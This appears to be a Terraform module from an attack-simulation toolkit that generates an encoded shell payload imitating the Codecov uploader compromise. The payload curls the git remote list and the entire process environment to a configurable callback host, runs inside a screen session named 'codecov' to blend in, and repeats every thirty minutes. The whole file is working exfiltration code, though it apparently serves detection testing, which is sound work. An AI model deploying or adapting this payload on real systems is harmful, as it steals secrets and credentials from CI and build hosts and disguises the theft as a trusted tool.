locals {
    host_ip = var.inputs["host_ip"]
    host_port = var.inputs["host_port"]
    git_origin=var.inputs["git_origin"]
    env_secrets=join(" ", var.inputs["env_secrets"])
    callback_url = var.inputs["use_ssl"] == true ? "https://${local.host_ip}:${local.host_port}" : "http://${local.host_ip}:${local.host_port}"
    command_payload=<<-EOT
    LOGFILE=/tmp/${basename(path.module)}_command.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    rm -rf /tmp/repo
    mkdir -p /tmp/repo
    cd /tmp/repo
    git init
    git remote add origin ${local.git_origin}
    log "running curl post: curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2"
    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" ${local.callback_url}/upload/v2 >> $LOGFILE 2>&1
    sleep 30
    exit
    EOT
    base64_command_payload=base64encode(local.command_payload)
    payload = <<-EOT
    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        screen -S codecov -X quit
        truncate -s 0 /tmp/codecov.log
        log "checking for git..."
        while ! command -v git; do
            log "git not found - waiting"
            sleep 10
        done
        log "git: $(command -v  git)"
        screen -d -Logfile /tmp/codecov.log -S codecov -m env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ${local.env_secrets} /bin/bash --noprofile --norc
        screen -S codecov -X colon "logfile flush 0^M"
        log 'sending screen command: ${local.command_payload}';
        screen -S codecov -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
        log 'waiting 30 minutes...';
        sleep 1800
        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        if [ "$CHECK_HASH" != "$START_HASH" ]; then
            log "payload update detected - exiting loop"
            break
        else
            log "restarting loop..."
        fi
    done
    EOT

    base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = "git"
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = "git"
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }}))

    outputs = {
        base64_payload = local.base64_payload
    }
}